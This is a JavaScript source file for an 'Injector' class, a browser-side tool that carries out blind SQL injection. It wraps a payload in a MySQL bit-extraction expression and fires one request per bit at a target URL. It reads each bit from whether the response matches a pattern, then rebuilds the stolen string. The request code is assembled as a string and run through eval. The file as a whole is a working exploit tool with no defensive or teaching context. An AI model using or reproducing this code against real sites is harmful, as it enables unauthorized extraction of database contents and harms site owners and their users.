function Injector(method, url, params, payload, pattern) {  
    this.sc = {}; 
    this.sc.xhr = "var xhr = new XMLHttpRequest();";  
    this.result = [];  
    this.cursor = 1; 
    this.method = method; 

    if(url[0] == '/') { 
        this.url = url; 
    } else { 
        this.url = location.pathname; 
    } 
     
    this.params = params; 
    this.pattern = pattern; 
    this.payload = payload; 

    var hexReg = /{\$hex\((.*)\)}/; 
    if(payload.match(hexReg)) { 
        this.payload = this.payload.replace(hexReg,this.hex(hexReg.exec(this.payload)[1])); 
    } 

    this.bisPost = (method.toLowerCase() == 'post'); 

    this.wrapper = 'mid(lpad(bin(ord(mid($p,\x22+i+\x22,1))),8,0),\x22+j+\x22,1)'; 
    this.replace('\\$p',this.wrapper); 
    this.replace('\\$p',this.payload); 

    this.sc.requestHeaders = [];  
    if (this.bisPost) {  
        this.sc.requestHeaders.push("xhr.setRequestHeader(\x22Content-Type\x22,\x22application/x-www-form-urlencoded\x22);");  
    } 
    this.sc.handler = "xhr.onreadystatechange = function(){if(this.readyState == 4 && this.status == 200){ref.result[i-1][j-1] = !!this.responseText.match(ref.pattern)+0;}}";  
    this.prepare();  
} 

Injector.prototype.execute = function(len) {  
    for (var i = this.cursor; i <= this.cursor+len; i++) {  
        this.result[i - 1] = [];  
        for (var j = 1; j <= 8; j++) {  
            this.send(i, j)  
        }  
    }  
    this.cursor = this.cursor+len;  
} 

Injector.prototype.toString = function() {  
    var answer = '';  
    for (var i = 0; i < this.result.length; i++) {  
        answer += String.fromCharCode(parseInt(this.result[i].join(""), 2))  
    }  
    return answer;  
} 

Injector.prototype.prepare = function() {  
    var ref = this; 
     
    if(this.bisPost) { 
        this.sc.opener = "xhr.open(\x22" + this.method + "\x22, \x22" + this.url + "\x22);"; 
        this.sc.sender = "xhr.send(\x22" + this.params + "\x22);"; 
    } else { 
        this.sc.opener = "xhr.open(\x22" + this.method + "\x22, \x22" + this.url + '?' + this.params + "\x22);"; 
        this.sc.sender = "xhr.send(null);";  
    } 
    this.sc.content = [this.sc.xhr, this.sc.opener, this.sc.sender, this.sc.requestHeaders.join(" "), this.sc.handler].join(" ");  
    eval('this.send = function(i,j){' + this.sc.content + '}');  
} 

Injector.prototype.replace = function(from,to) { 
    this.url = this.url.replace(new RegExp(from,'g'),to); 
    console.log(this.url); 

    this.params = this.params.replace(new RegExp(from,'g'),to); 
    console.log(this.params); 
} 

Injector.prototype.hex = function (str) { 
    result = '0x'; 
    for(var i=0; i<str.length; i++) { 
        result += str.charCodeAt(i).toString(16); 
    } 
    return result; 
}